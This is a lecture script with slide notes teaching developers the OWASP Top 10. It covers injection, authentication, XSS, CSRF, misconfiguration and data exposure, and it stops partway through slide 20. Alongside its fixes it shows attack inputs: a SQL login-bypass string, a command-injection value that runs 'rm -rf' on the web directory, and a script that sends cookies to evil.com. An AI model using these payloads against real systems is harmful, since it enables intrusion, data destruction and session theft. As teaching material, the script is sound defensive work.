Coding Security & OWASP – Full Hour Presentation Script with Slide Notes

SLIDE 1: Title Slide
Slide Content:

Title: Coding Security & OWASP: Identifying and Preventing the Top Vulnerabilities
Subtitle: Writing Code That Defends Itself
Course name, your name, date


SCRIPT (~2 minutes)
"Welcome back everyone. Over the past few sessions we've been building your foundation in secure development concepts. Today we're going to put a lot of that together in a focused, practical way.
This lesson is specifically about the OWASP Top 10 — the most critical, most exploited, most dangerous vulnerabilities in web applications — and what you as a developer need to know to identify them in code and prevent them from day one.
We're going to move through several major vulnerability categories today: injection attacks, broken authentication and session management, Cross-Site Scripting, Cross-Site Request Forgery, security misconfiguration, and sensitive data exposure. For each one, I'm going to show you what the attack looks like, why it works, and exactly how to stop it.
Future lessons will go deeper on some of these topics, and we'll look at specific frameworks and tools. But today is about building the mental model — the instincts — that every secure developer needs to have. By the end of this class, you should be able to look at a block of code and immediately spot the red flags.
Let's get into it."


SLIDE 2: Why Application Security Matters
Slide Content:

The #1 attack surface for organizations is their own applications
43% of data breaches involve web application vulnerabilities (Verizon DBIR)
Average cost of a data breach: $4.45 million (IBM, 2023)
Security is not a feature — it is a requirement
Real breaches caused by the vulnerabilities we cover today:

Equifax (2017) — 147 million records — injection + misconfiguration
Yahoo (2013–2016) — 3 billion accounts — broken authentication
British Airways (2018) — XSS-based attack — 500,000 customers




SCRIPT (~3 minutes)
"Before we get technical, I want to make sure everyone understands the stakes. Because I find that security sometimes feels abstract until you connect it to the real world.
According to the Verizon Data Breach Investigations Report, 43% of all data breaches involve web application vulnerabilities. Not network attacks, not hardware failures — application code. Code that developers wrote. Code that, in many cases, violated the exact principles we're going to discuss today.
The average cost of a data breach in 2023 was $4.45 million according to IBM. That's not just a fine — that's legal fees, regulatory penalties, customer notification, remediation, lost business, and reputational damage. Companies have gone bankrupt over security breaches. Careers have ended.
Look at these examples. Equifax in 2017 — 147 million Americans had their Social Security numbers, birth dates, and addresses stolen. The root causes? An unpatched vulnerability in a web framework and security misconfiguration. Both are on our list today. Yahoo — three billion user accounts compromised. The root cause included broken authentication and weak cryptography. British Airways in 2018 — attackers injected malicious JavaScript into their booking page and silently harvested credit card details from 500,000 customers in real time. That is Cross-Site Scripting. Also on our list today.
Every one of those breaches was preventable. Every single one of them happened because developers either didn't know about these vulnerabilities or didn't take them seriously. That will not be said about you when you leave this course. Let's make sure of that."


SLIDE 3: Secure Coding Fundamentals – The Core Principles
Slide Content:

Defense in Depth — Multiple security layers; no single point of failure
Principle of Least Privilege — Grant only the minimum access required
Fail Securely — On error, default to deny — never default to allow
Never Trust User Input — Validate, sanitize, and encode all external data
Keep Security Simple — Complexity creates blind spots and bugs
Security by Design — Security is built in from the start, not added at the end
Open Design — Security should not rely on secrecy of implementation


SCRIPT (~5 minutes)
"Before we look at any specific attack, we need to internalize the principles that underpin all secure coding. These are the mental models you carry with you every single day as a developer. These aren't Spring-specific or Java-specific or Python-specific — they apply to every language, every framework, every system you will ever build.
Defense in Depth. Never rely on a single security control. Think of it like a medieval castle — there's a moat, outer walls, inner walls, guards, locks on every door. If the moat is crossed, the walls still hold. If a wall is breached, the guards respond. In software, this means: even if your firewall stops most attackers, your application should still authenticate users. Even if authentication works, your authorization layer should still check permissions. Layers upon layers. No single point of failure.
Principle of Least Privilege. This one is violated constantly in real codebases. Every user, every service account, every API key, every database connection should have the minimum permissions it needs to do its specific job — and nothing more. Your web application's database account should be able to read and write the tables it needs. It should not be able to drop tables, create new admin users, or read financial records it has no business touching. When something goes wrong — and something always eventually goes wrong — least privilege limits the damage.
Fail Securely. When your code encounters an error, what does it do? Too many developers write error handling that defaults to open — 'something went wrong, let the user through anyway.' That is failing unsafely. Your code should always fail closed. If authentication fails, deny access. If authorization throws an exception, deny access. If validation is inconclusive, deny and log. Always fail in the direction of security.
Never Trust User Input. I'm going to say this repeatedly today and I make no apology for it. Every piece of data that enters your application from outside — from a form field, a URL parameter, a cookie, an HTTP header, an API response, a file upload, anything — is potentially hostile. It must be validated against what you expect, sanitized to remove dangerous content, and encoded appropriately before use. This single principle, if followed rigorously, would prevent the majority of the attacks we discuss today.
Keep It Simple. Security systems fail when they become too complex to reason about correctly. A convoluted custom authentication flow is almost certainly less secure than a well-tested, simple, standard one. When you write security-critical code, favor clarity over cleverness. Write code your teammates can read and audit easily.
Security by Design. This is a cultural principle as much as a technical one. Security cannot be something you think about in the last sprint before launch. It has to be part of requirements gathering, architecture design, code review, and testing. The cost of fixing a security flaw grows exponentially the later in the development lifecycle you find it. Find it at design time — nearly free. Find it in production after a breach — catastrophically expensive.
Keep these principles in your head as we go through today's material. You'll see every single one of them in action."


SLIDE 4: What Is OWASP and the OWASP Top 10?
Slide Content:

OWASP = Open Web Application Security Project
Free, open-source, community-driven non-profit
Produces tools, documentation, and the industry-standard OWASP Top 10
The Top 10 is compiled from real vulnerability data across hundreds of organizations worldwide
Updated periodically — current version: OWASP Top 10 2021
Used by organizations, auditors, and security certifications globally as the minimum security baseline


SCRIPT (~2 minutes)
"OWASP — the Open Web Application Security Project — is the organization behind the framework we're using today. It's a non-profit community of security researchers, developers, and practitioners who produce free resources to help the world build more secure software. Their crown jewel is the OWASP Top 10.
The Top 10 is exactly what it sounds like — the ten most critical categories of security risk in web applications. But it's not just a list someone made up. It's compiled from vulnerability data contributed by hundreds of companies and security firms, representing millions of tested applications. It reflects what's actually happening out in the real world.
When you go for a security audit, when you apply for security certifications, when enterprises evaluate whether to use your software — the OWASP Top 10 is the baseline they check against. Knowing this list, understanding each entry, and knowing how to address each one is a fundamental professional requirement for any developer working on web applications."


SLIDE 5: The OWASP Top 10 (2021) – Full Overview
Slide Content:
RankCategoryA01Broken Access ControlA02Cryptographic FailuresA03InjectionA04Insecure DesignA05Security MisconfigurationA06Vulnerable and Outdated ComponentsA07Identification and Authentication FailuresA08Software and Data Integrity FailuresA09Security Logging and Monitoring FailuresA10Server-Side Request Forgery (SSRF)
Today's focus: A03, A05, A07 — plus XSS, CSRF, and Sensitive Data Exposure

SCRIPT (~2 minutes)
"Here is the full OWASP Top 10 for 2021. Take a photo, write it down, bookmark it — this is your security checklist as a developer. Every time you ship a feature, you should be mentally scanning this list.
Today we're going deep on Injection, Security Misconfiguration, Identification and Authentication Failures, and we'll cover XSS and CSRF which intersect several of these categories. We'll also cover sensitive data exposure which maps directly to Cryptographic Failures at number two.
The entries we don't fully cover today are absolutely important — Broken Access Control is actually number one, and we'll get to it. Insecure Design, Logging and Monitoring, and the others will be addressed in upcoming sessions. But the ones we're covering today have historically been responsible for the most damaging real-world attacks. So let's start with the one that held the number one spot for over a decade."


SLIDE 6: A03 – Injection Attacks: Concept
Slide Content:

Definition: Attacker sends malicious data to an interpreter as part of a command or query
The interpreter executes the attacker's data as code
Most common types:

SQL Injection — targets database engines
Command Injection — targets OS shell
LDAP Injection — targets directory services
XML/XPath Injection — targets XML parsers


Root cause: Unsanitized user input concatenated directly into commands or queries
Impact: Data theft, authentication bypass, full data destruction, remote code execution


SCRIPT (~3 minutes)
"Injection. This was number one on the OWASP list for over a decade and only recently dropped to number three. That doesn't mean it's less dangerous — it means the industry has gotten slightly better at addressing it while other problems have grown. It is still one of the most devastating vulnerability classes that exists.
The concept behind all injection attacks is the same: your application takes input from the outside world and passes it to an interpreter — a database, an operating system shell, an LDAP server — without properly separating the data from the commands. The attacker crafts their input to include malicious commands. The interpreter can't tell the difference between your code's intended commands and the attacker's injected commands, so it executes both.
There are several flavors of injection. SQL injection is the most famous and targets database engines. Command injection targets the operating system shell. LDAP injection targets directory services. They all share the same root cause: the developer trusted user input and passed it directly into a command-building function without validation or parameterization.
The impact ranges from bad to catastrophic. An attacker can read data they shouldn't see, modify or delete records, bypass authentication entirely, and in the worst cases — depending on the database configuration and OS permissions — execute arbitrary commands on the underlying server. Let me show you exactly how this happens."


SLIDE 7: SQL Injection – The Attack in Detail
Slide Content:
❌ Vulnerable Code:
javaString query = "SELECT * FROM users WHERE username='" 
    + username + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
Attacker Input:

Username: admin' --
Password: anything

Resulting Query Executed by the Database:
sqlSELECT * FROM users WHERE username='admin' --' AND password='anything'

-- is a SQL comment — everything after it is ignored
The password check is bypassed entirely
Attacker is authenticated as admin with no valid credentials


SCRIPT (~4 minutes)
"Let's look at this concretely with code. Here's a Java snippet that's vulnerable to SQL injection. The developer is building a login query by concatenating the username and password values directly from user input into a SQL string. This code works perfectly in normal testing. It does exactly what it's supposed to do. And it will get you fired when it gets exploited.
Here's what an attacker does. In the username field they type: admin apostrophe space dash dash. Password can be anything — it doesn't matter. Watch what happens when those values get plugged into the query string.
The single quote after 'admin' closes the SQL string that was wrapping the username. Then the double dash — which is a standard SQL comment character — causes the database engine to treat everything that follows as a comment and ignore it. The AND password check? Gone. Ignored. The query now simply reads: find me the user whose username is admin. The database finds the admin record and returns it. The attacker is now authenticated as admin without ever knowing the password.
And that's the gentle version. A more sophisticated attacker can use a UNION statement to join a second SELECT query to the first and retrieve any table in the database — users, credit cards, medical records, everything. They can use database-specific functions to read files from the server's filesystem. On Microsoft SQL Server, they can execute xp_cmdshell and run operating system commands directly. On MySQL with certain configurations, they can write files to the server.
Let me tell you about a real case so this sticks. In 2008, Heartland Payment Systems — a major credit card processor — was breached through SQL injection. One hundred and thirty million credit card records were stolen. This wasn't a sophisticated nation-state attack. This was someone typing malicious input into a form field. One hundred and thirty million records."


SLIDE 8: SQL Injection – Prevention
Slide Content:
✅ Parameterized Queries (Prepared Statements):
javaString query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, hashedPassword);
ResultSet rs = stmt.executeQuery();
✅ ORM / Named Parameters:
java@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
✅ Additional Defenses:

Validate and whitelist input — reject anything unexpected
Apply Least Privilege to database accounts
Never display raw database error messages to users
Use a Web Application Firewall (WAF) as a secondary layer

❌ Never concatenate user input into SQL strings — ever

SCRIPT (~3 minutes)
"The fix is parameterized queries — also called prepared statements — and it is non-negotiable. There is no legitimate reason in modern development to concatenate user input into SQL strings.
Here's how it works. Instead of building your query string with the user data embedded in it, you write the query with placeholder question marks where the data will go. You then pass the actual user input as separate parameters using setString or equivalent methods.
The critical insight is this: the database engine receives the query structure and the data values completely separately. It processes the query structure first — it knows the question marks are data slots. Then it slots the data in. No matter what the user typed — even if they typed an entire SQL statement — the database engine treats it as a literal string value to be compared against, not as SQL syntax to be executed. The single quote in admin-apostrophe is treated as a literal apostrophe character in a name, not as a SQL string delimiter.
When you're using an ORM like Hibernate or Spring Data JPA, this protection is built in by default when you use proper annotations and query methods. Your repository's findByUsername method is using parameterized queries under the hood. You still need to understand what's happening — and you still need to be careful if you ever drop to native queries — but the ORM handles the basic protection.
Beyond parameterized queries: validate your inputs and whitelist expected formats. A username probably shouldn't contain apostrophes or semicolons — reject it if it does. Apply least privilege to your database accounts — your application account shouldn't be able to drop tables or access tables it doesn't need. And never expose raw database error messages to users — error messages tell attackers exactly what your database structure looks like and help them refine their attacks."


SLIDE 9: Command Injection – The Attack and Prevention
Slide Content:
❌ Vulnerable Code:
javaString filename = request.getParameter("file");
Runtime.getRuntime().exec("cat /var/reports/" + filename);
```

**Attacker Input:**
```
report.pdf; rm -rf /var/www/html
What Executes:
bashcat /var/reports/report.pdf; rm -rf /var/www/html
Deletes the entire web directory

✅ Prevention:

Avoid calling OS commands from application code entirely
If unavoidable: use parameterized APIs (ProcessBuilder with argument arrays)
Validate input strictly — whitelist allowed values
Run application with minimal OS permissions

java// Safer approach with ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("cat", "/var/reports/" + sanitizedFilename);

SCRIPT (~3 minutes)
"Command injection is the same concept as SQL injection but targeting the operating system shell instead of a database. And its consequences are often even more severe — because the OS shell has access to everything on the server.
Look at this example. The developer wants to serve a file to the user — they take the filename from the request parameter and pass it directly to a shell command using Runtime.exec. The attacker enters: report.pdf semicolon rm -rf /var/www/html. The semicolon is a shell command separator. The OS executes both commands — first cat, then the destructive rm command. The entire web directory is deleted.
An attacker could instead enter a command that opens a reverse shell back to a server they control — giving them an interactive terminal session on your server. At that point, your application is completely compromised.
The best prevention for command injection is simply: don't call OS commands from your application code at all. In most cases there's a safer, language-native API that accomplishes the same thing. Need to read a file? Use Java's file I/O APIs, not a shell command. Need to compress something? Use a library. If you absolutely must execute an OS command, use ProcessBuilder with an argument array rather than a concatenated string — the array form does not invoke the shell, so shell metacharacters like semicolons don't get interpreted as command separators. And validate your input rigorously — if you're expecting a filename, whitelist exactly what a filename is allowed to look like and reject anything else."


SLIDE 10: A07 – Broken Authentication and Session Management
Slide Content:

Definition: Weaknesses in authentication or session handling that allow attackers to compromise passwords, keys, or session tokens — and assume other users' identities
Common failures:

Weak or default credentials allowed
Passwords stored in plaintext or with weak hashing
Missing or ineffective brute-force protection
Session tokens exposed in URLs
Session tokens not invalidated on logout
Session tokens not regenerated after login
Missing or weak multi-factor authentication


Impact: Full account takeover, privilege escalation, identity theft


SCRIPT (~3 minutes)
"Let's move to Broken Authentication — number seven on the current list but genuinely one of the most impactful categories. When authentication fails, attackers don't need to break your application logic — they just walk in as a legitimate user. And that's extremely hard to detect and stop.
Authentication failures come in many forms. Some of them are obvious — like allowing the password '123456' or shipping your application with default admin credentials. But many are subtle and easy to get wrong even for experienced developers.
Credential stuffing is a massive modern threat: attackers take username and password pairs leaked from other breaches — there are billions of them available — and try them automatically against your application. If you don't have rate limiting and account lockout, they'll find every account where someone reused a password.
Session management failures are equally dangerous. A session token is essentially a temporary credential — it represents an authenticated user. If that token is exposed in a URL, it can be stolen from browser history, server logs, or referrer headers. If it's not properly invalidated when the user logs out, it can be replayed by anyone who captured it. If it's not regenerated after successful login, an attacker who set up a session before authentication can inherit the now-authenticated session — this is called session fixation.
And password storage — this deserves its own conversation."


SLIDE 11: Password Storage – Doing It Right
Slide Content:
❌ Never do this:
java// Plaintext
user.setPassword(password);

// Weak hashing — MD5 or SHA1 are broken for passwords
String hash = DigestUtils.md5Hex(password);
✅ Always use a proper password hashing algorithm:
java// BCrypt — built into Spring Security
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hashedPassword = encoder.encode(rawPassword);

// Verification
boolean matches = encoder.matches(rawPassword, storedHash);
Why BCrypt?

Intentionally slow — resists brute-force and rainbow table attacks
Automatically generates and stores a unique salt per password
Work factor (cost parameter) is adjustable as hardware improves
Alternatives: Argon2 (preferred for new systems), SCrypt


SCRIPT (~3 minutes)
"Password storage is an area where well-meaning developers make catastrophic mistakes. Let me be direct: storing passwords in plaintext is a fireable offense. If your database is breached — and you must assume it will be at some point — every single user account across every site where that user reused their password is now compromised. You're not just responsible for your breach; you're enabling breaches everywhere else.
Weak hashing is almost as bad. MD5 and SHA1 are general-purpose hash functions — they're fast, and that's their problem. Attackers can compute billions of MD5 hashes per second on consumer GPU hardware. They pre-compute rainbow tables covering most common passwords. A database full of MD5-hashed passwords gets cracked in hours.
BCrypt is the correct choice for most systems and it's built directly into Spring Security. BCrypt is intentionally and computationally expensive — that's by design. Where MD5 can do billions of hashes per second, BCrypt is designed to do only a handful. That sounds like a problem until you realize: your legitimate users are each hashing their password once on login. The attacker trying to crack stolen hashes needs to hash every candidate password millions or billions of times. Making each hash expensive kills their attack.
BCrypt also automatically generates a unique salt for every password — which means even if two users have the same password, their hashes are different, and rainbow tables are useless.
The cost parameter — 12 in my example — controls how expensive the operation is. As hardware gets faster over time, you can increase this value. For new systems, Argon2 is now generally recommended as the most resistant algorithm, but BCrypt is battle-tested and appropriate for most applications."


SLIDE 12: Session Management Best Practices
Slide Content:
✅ Secure session configuration:
java// Spring Security session management
http.sessionManagement()
    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
    .sessionFixation().migrateSession()  // Regenerate session ID after login
    .maximumSessions(1)                  // Limit concurrent sessions
    .expiredUrl("/login?expired");

// Secure cookie configuration
http.sessionManagement()
    .and().rememberMe()
    .and().headers()
    .frameOptions().deny();
✅ Session Security Checklist:

Session token must be long, random, unpredictable (use framework defaults)
Set HttpOnly flag — prevents JavaScript from reading the cookie
Set Secure flag — cookie only sent over HTTPS
Set SameSite=Strict or Lax — prevents CSRF attacks
Invalidate session completely on logout
Set appropriate session timeout
Never put session tokens in URLs


SCRIPT (~3 minutes)
"Session management is one of those areas where using your framework correctly buys you most of the security you need — but you have to actually configure it correctly, not just leave defaults in place.
A few critical points. Session fixation is an attack where the attacker sets a known session ID before you log in — maybe by sending you a crafted link — and then after you authenticate, your application keeps using that same session ID. Now the attacker already has your session token. The fix is to always regenerate the session ID immediately after successful authentication. Spring Security's migrateSession() does exactly this.
The HttpOnly flag on the session cookie means JavaScript cannot access it. This is critical for preventing XSS attacks — which we'll cover next — from stealing your session token. Always set this flag.
The Secure flag means the browser will only send this cookie over HTTPS connections. Without it, the cookie can be transmitted in plaintext on HTTP and intercepted. Always set this flag.
SameSite is a newer but critically important attribute. With SameSite=Strict, the browser won't send the cookie on cross-site requests at all. This is a major mitigation for CSRF attacks, which we'll cover shortly.
Never put session tokens in URLs. They end up in browser history, server logs, access logs, and referrer headers. They will be leaked.
And when a user logs out, invalidate the session on the server side completely — don't just clear the client-side cookie. An attacker who captured the token can still replay it if the server-side session still exists."


SLIDE 13: Cross-Site Scripting (XSS) – The Attack
Slide Content:

Definition: Attacker injects malicious JavaScript into a web page that is then executed in other users' browsers
Three types:

Reflected XSS — script comes from the request (URL parameter), reflected immediately in the response
Stored XSS — script is saved to the database and served to all visitors
DOM-based XSS — script manipulates the DOM via JavaScript without involving the server


Root cause: User-supplied data rendered in HTML without proper output encoding
Impact: Session theft, credential harvesting, malware delivery, full account takeover, defacement


SCRIPT (~3 minutes)
"Cross-Site Scripting — XSS — is the most common client-side vulnerability and one of the most frequently exploited vulnerabilities overall. The premise is that your application takes user-supplied data and renders it into an HTML page without properly encoding it first. Anything the user typed gets interpreted as HTML and JavaScript by the browser — including script tags and event handlers.
There are three varieties. Reflected XSS happens when malicious input comes in through a URL parameter or form field, gets immediately reflected back in the response, and executes in the victim's browser. The attacker tricks the victim into clicking a crafted link. Stored XSS is more dangerous — the malicious script gets saved to your database through a comment form, a profile field, a message — and then served to every user who views that content. One injection attack affects potentially thousands of visitors. DOM-based XSS happens entirely on the client side through JavaScript DOM manipulation, never touching the server.
Remember British Airways? That was a stored XSS variant — attackers injected JavaScript into the booking page that silently captured every payment card number entered and sent it to a server they controlled. Customers had no idea. The script ran for two weeks before it was detected. Five hundred thousand people's payment details were stolen.
What can you do with XSS? Steal the session cookie and impersonate the user — full account takeover. Capture everything the user types — keylogging, credential harvesting. Redirect the user to a phishing page. Modify the page content to trick the user into taking actions. Deliver malware. The browser trusts the script because it appears to come from your domain — that's what makes XSS so powerful."


SLIDE 14: XSS – Example and Prevention
Slide Content:
❌ Vulnerable — rendering user input without encoding:
java// In a servlet or controller
String name = request.getParameter("name");
response.getWriter().println("<h1>Hello, " + name + "</h1>");
Attacker input:
html<script>document.location='https://evil.com/steal?c='+document.cookie</script>
Result: Script executes in every victim's browser, sending their session cookie to the attacker

✅ Prevention:
java// Output encoding with OWASP Java Encoder
import org.owasp.encoder.Encode;
response.getWriter().println("<h1>Hello, " 
    + Encode.forHtml(name) + "</h1>");

// Thymeleaf (default) auto-encodes all output
<h1 th:text="${name}">Hello</h1>   ✅ Safe — auto-encoded
<h1 th:utext="${name}">Hello</h1>  ❌ Unsafe — raw HTML output
✅ Additional Defenses:

Content Security Policy (CSP) header — whitelist which scripts are allowed to execute
HttpOnly cookie flag — prevents XSS from stealing session cookies
Input validation — reject unexpected characters
Use modern templating engines that auto-escape by default


SCRIPT (~4 minutes)
"Here's XSS in code. The developer takes a name from a request parameter and writes it directly into the HTML response. When a normal user visits with their name in the URL, it works perfectly. When an attacker crafts a URL where the name parameter contains a script tag with malicious JavaScript, the browser receives that script as part of the HTML and executes it immediately.
In the example I've shown, the script redirects document.location to an attacker-controlled server, passing the document.cookie value in the URL. The attacker's server logs the incoming request, extracts the session cookie from it, pastes that cookie into their browser, and they are now authenticated as the victim. Done. Account taken over.
The fix has two parts: output encoding and Content Security Policy.
Output encoding means: before you take any user-supplied data and insert it into HTML, you encode it so that special characters are converted to their HTML entity equivalents. The less-than sign becomes ampersand-lt-semicolon. The greater-than sign becomes ampersand-gt-semicolon. Now the browser displays those characters as text — it never interprets them as HTML tags. The OWASP Java Encoder library is the standard tool for this in Java.
In modern frameworks like Thymeleaf — which Spring Boot uses by default — output encoding is automatic. When you use th:text, Thymeleaf HTML-encodes the value for you. The danger is th:utext — which stands for unescaped text — which outputs raw HTML. Only use th:utext when you have an explicit, reviewed reason to render HTML from a variable, and that content must come from a trusted, controlled source.
Content Security Policy is a response header you send with every page that tells the browser which sources of scripts are allowed to execute. With a strict CSP, even if an attacker successfully injects a script tag, the browser refuses to execute it because the source isn't on your whitelist. It's a powerful second line of defense.
Combined with HttpOnly cookies — which prevent JavaScript from accessing the session cookie at all — you significantly limit what XSS can accomplish even if a vulnerability exists."


SLIDE 15: Cross-Site Request Forgery (CSRF) – The Attack
Slide Content:

Definition: Attacker tricks an authenticated user's browser into making an unwanted request to your application
The browser automatically includes the user's cookies — including the session token
Your server sees a request with valid credentials and executes it
How it works:

Victim is logged into your bank at bank.com
Victim visits attacker's page — which contains a hidden form or image tag targeting bank.com
Victim's browser automatically sends the request to bank.com with their session cookie
Bank processes the transfer — it looks like a legitimate authenticated request


Impact: Unauthorized state-changing actions — transfers, password changes, account deletion, admin actions


SCRIPT (~3 minutes)
"CSRF — Cross-Site Request Forgery — is sneaky because it doesn't break into your application at all. It uses your own users as unwitting accomplices.
Here's the scenario. Your user is logged into their bank account in one browser tab. They still have an active session — the bank's session cookie is sitting in their browser. In another tab, they click a link to what looks like a funny cat picture. That page, controlled by the attacker, contains a hidden HTML form that targets your bank's transfer endpoint. The form has amount, destination account, everything filled in. It submits automatically using JavaScript the moment the page loads.
The victim's browser sends the transfer request to the bank. It automatically includes the bank's session cookie, because that's how cookies work — the browser includes them on every request to the matching domain. The bank's server receives what looks like a completely legitimate, authenticated request. It has a valid session. It processes the transfer.
The victim never saw a login prompt. Never typed anything. Never consciously took an action. Their browser was weaponized by simply visiting a page.
CSRF works on any state-changing operation — not just bank transfers. Password changes, email address changes, admin user creation, account deletion. If your application performs these operations in response to authenticated HTTP requests, and you don't have CSRF protection, an attacker can trigger them remotely."


SLIDE 16: CSRF – Prevention
Slide Content:
✅ CSRF Token (Synchronizer Token Pattern):

Server generates a unique, unpredictable token per session
Token is embedded in every form as a hidden field
Server validates the token on every state-changing request
Attacker cannot know or predict the token from a cross-origin page

java// Spring Security enables CSRF protection by default for web apps
// In your forms (Thymeleaf auto-injects the token):
<form method="post" action="/transfer">
    <input type="hidden" th:name="${_csrf.parameterName}" 
           th:value="${_csrf.token}"/>
    <!-- form fields -->
</form>
```

**✅ SameSite Cookie Attribute:**
```
Set-Cookie: JSESSIONID=abc123; SameSite=Strict; Secure; HttpOnly

SameSite=Strict — browser never sends cookie on cross-site requests
SameSite=Lax — sends on top-level navigation only (good default)

✅ Additional:

Verify Origin and Referer headers for sensitive operations
Require re-authentication for critical actions (password change, payments)


SCRIPT (~3 minutes)
"The primary defense against CSRF is the CSRF token, also called the synchronizer token pattern.
Here's the idea: when your server sends a form to the user, it embeds a secret, randomly generated token in that form as a hidden field. It also remembers that token server-side, associated with the user's session. When the user submits the form, that token is included in the submission. The server checks: does the token in this request match the token I generated for this session? If yes, process it. If no, or if the token is missing, reject it.
Why does this stop CSRF? Because the attacker's malicious page is on a different origin. The browser's same-origin policy prevents cross-origin pages from reading content from your domain. The attacker cannot read your form to extract the CSRF token. They can submit a request to your server, but they can't include the correct token because they can't read it. The server rejects it.
Spring Security enables CSRF protection by default for web applications. Thymeleaf automatically injects the CSRF token into your forms. You get this protection with zero extra code in most standard setups. However — and this is important — when you explicitly disable CSRF protection in your Spring Security configuration, which you sometimes see in tutorials for stateless REST APIs, make absolutely sure you understand the implications and that your alternative protections are sufficient.
The SameSite cookie attribute is a complementary defense that's become very important. With SameSite=Strict, the browser flat-out refuses to include the cookie on any cross-site request. The CSRF attack simply can't attach the session credential because the browser won't send it. This is increasingly the first line of defense in modern applications."


SLIDE 17: A05 – Security Misconfiguration
Slide Content:

Definition: Security settings are defined, implemented, or maintained improperly — or left at insecure defaults
Common failures:

Default credentials not changed (admin/admin, etc.)
Unnecessary features, ports, services, or accounts left enabled
Detailed error messages exposing stack traces to users
Missing or improper security headers
Cloud storage buckets with public read access
Running unnecessary software with elevated privileges
Unpatched systems — Equifax breach: unpatched Apache Struts


Impact: Varies from information disclosure to full system compromise


SCRIPT (~3 minutes)
"Security misconfiguration is number five and it's the broadest category on the list. It's not one specific attack type — it's the entire class of security failures that comes from not configuring your systems securely. And it's incredibly common because there are so many places where configuration decisions are made.
Default credentials are the classic example and they're embarrassing when exploited, because the fix is literally just changing a password. But organizations deploy systems with default admin passwords constantly, those systems get indexed by Shodan or similar tools, and attackers log right in.
Verbose error messages are a subtle but real problem. When your application throws an unhandled exception and your Java stack trace gets sent back to the user's browser, you've just told an attacker: which framework you're using, which version, your internal package structure, and often which database and query failed. That's a detailed map of your system for free. Production applications should show generic user-friendly error messages and log the details internally.
Unnecessary services and features represent unnecessary attack surface. If your web server has a component enabled that you don't use, that component can be exploited even though your actual application didn't use it.
Cloud storage misconfiguration deserves special mention. S3 buckets and equivalent storage in other cloud providers have been left publicly readable countless times, exposing millions of sensitive files. This is entirely a configuration problem — the code is fine, the developer just didn't restrict access on the storage bucket.
The Equifax breach — 147 million Social Security numbers stolen — was triggered by an unpatched vulnerability in Apache Struts. They knew about the patch. They had a two-month window to apply it. They didn't. Misconfiguration through inaction is still misconfiguration."


SLIDE 18: Security Misconfiguration – Prevention
Slide Content:
✅ Spring Security Headers Configuration:
javahttp.headers()
    .contentSecurityPolicy("default-src 'self'")
    .and()
    .xssProtection().block(true)
    .and()
    .contentTypeOptions()
    .and()
    .frameOptions().deny()
    .and()
    .httpStrictTransportSecurity()
        .maxAgeInSeconds(31536000)
        .includeSubDomains(true);
✅ Secure Configuration Checklist:

Change ALL default credentials before deployment
Disable or remove unused features, endpoints, ports, services
Show generic error pages in production; log details internally
Regularly apply security patches — subscribe to CVE notifications
Use a minimal footprint — only install what you need
Perform security configuration reviews before each deployment
Use infrastructure-as-code to enforce consistent configuration
Scan configurations with tools: OWASP ZAP, Trivy, cloud security scanners


SCRIPT (~3 minutes)
"Preventing misconfiguration is largely about discipline and process rather than code. But there are concrete technical actions.
Spring Security gives you a fluent API for setting security-related HTTP headers that modern browsers understand and enforce. Content Security Policy restricts which resources the browser loads. X-Content-Type-Options prevents MIME type sniffing. X-Frame-Options with DENY prevents your pages from being loaded in iframes — this stops clickjacking attacks. HTTP Strict Transport Security tells browsers to only communicate with your domain over HTTPS, even if someone types the plain HTTP address. These are all headers Spring Security can add automatically — use them.
Change default credentials. Full stop. Before anything else. Before your first commit to a shared repo. Create a pre-deployment checklist and this is item one.
In your Spring application, configure a custom error controller. Never let framework default error pages or stack traces reach production users. Log the full exception with a correlation ID internally, show the user a clean message with that correlation ID so support can look it up.
Patch management is a process problem but it's a critical one. Subscribe to the CVE feeds for every framework and library you use. Create a policy for how quickly critical vulnerabilities must be patched. Equifax had a critical patch available for over two months. Don't be Equifax.
Use automated scanning tools like OWASP ZAP in your CI/CD pipeline. Use Trivy or Snyk to scan your dependencies and container images for known vulnerabilities. Make security scanning a normal part of your build process so problems are found before deployment, not after."


SLIDE 19: Sensitive Data Exposure (Cryptographic Failures)
Slide Content:

Definition: Sensitive data is exposed due to lack of encryption, weak encryption, or implementation errors
What counts as sensitive data:

Passwords and credentials
Financial data — card numbers, bank accounts
Health and medical information
PII — names, SSNs, addresses, email
Authentication tokens and session IDs
Encryption keys and API secrets


Common failures:

Data transmitted over HTTP (plaintext)
Sensitive data stored unencrypted in databases
Weak algorithms: MD5, SHA1, DES, RC4
Hardcoded keys and passwords in source code
Private keys and secrets committed to version control




SCRIPT (~3 minutes)
"Sensitive data exposure — now listed as Cryptographic Failures at number two — is about what happens to sensitive information when it isn't adequately protected. This category is partly a technical problem and partly an awareness problem: developers often don't classify what data in their system is actually sensitive.
Let's establish that clearly. Passwords are sensitive — obviously. Payment card data is sensitive. Health information is sensitive. But also: email addresses, birth dates, IP addresses, browsing history, location data, authentication tokens, API keys, session IDs, encryption keys. If this data falls into the wrong hands, your users are harmed, your company faces regulatory liability, and you've violated their trust.
The failures here take multiple forms. Transmitting sensitive data over HTTP — not HTTPS — means it travels in plaintext across every network hop between the user and your server. Anyone on the same WiFi network, any intermediate network device, can read it. This is 2024 — there is no excuse for any production application to serve pages over plain HTTP.
Storing sensitive data unencrypted in a database means a single database breach exposes everything. Storing passwords without proper hashing — which we've covered — is one form of this.
Weak cryptographic algorithms are dangerous because they feel like security but provide very little. MD5 and SHA1 are broken for security purposes. DES is broken. RC4 is broken. Using them gives you a false sense of protection while providing minimal actual security.
And secrets in source code — hardcoded database passwords, API keys, encryption keys in your Java files or application.properties — is an extremely common mistake that gets developers fired and companies breached. If that code ever touches a version control system, that secret is now in the commit history potentially forever."


SLIDE 20: Sensitive Data Exposure – Prevention
Slide Content:
✅ Enforce HTTPS — Spring Security HTTPS redirect:
javahttp.requiresChannel()
    .anyRequest()
    .requiresSecure();
✅ Never hardcode secrets — use environment variables or secret managers:
java// ❌ Never do this
String apiKey = "sk-abc123supersecretkey";

// ✅ Use environment variables
String apiKey = System.getenv("API_KEY");
application.properties:
properties# ❌ Never commit real secrets
